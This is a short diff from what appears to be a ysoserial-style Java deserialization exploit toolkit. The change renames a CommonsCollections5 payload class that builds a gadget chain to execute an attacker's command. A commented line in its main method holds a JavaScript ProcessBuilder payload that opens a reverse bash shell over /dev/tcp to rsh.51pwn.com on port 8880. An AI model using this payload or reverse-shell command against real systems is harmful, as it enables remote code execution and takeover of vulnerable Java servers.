@@ -48,7 +48,7 @@ https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4e
 @PayloadTest ( precondition = "isApplicableJavaVersion")
 @Dependencies({"commons-collections:commons-collections:3.1"})
 @Authors({  Authors.S51pwn })
-public class CommonsCollections5_js extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {
+public class CommonsCollections5js extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {
     public BadAttributeValueExpException getObject(final String command) throws Exception {
 		final String[] execArgs = new String[] { command };
 		// inert chain for setup
@@ -82,7 +82,7 @@ public class CommonsCollections5_js extends PayloadRunner implements ObjectPaylo
 
 	public static void main(final String[] args) throws Exception {
 //        String []args1 = new String[]{"var x=new java.lang.ProcessBuilder(\"bash\",\"-c\",\"exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1\",\"&\");x.start().getInputStream();"};
-		PayloadRunner.run(CommonsCollections5_js.class, args);
+		PayloadRunner.run(CommonsCollections5js.class, args);
 	}
 
     public static boolean isApplicableJavaVersion() {
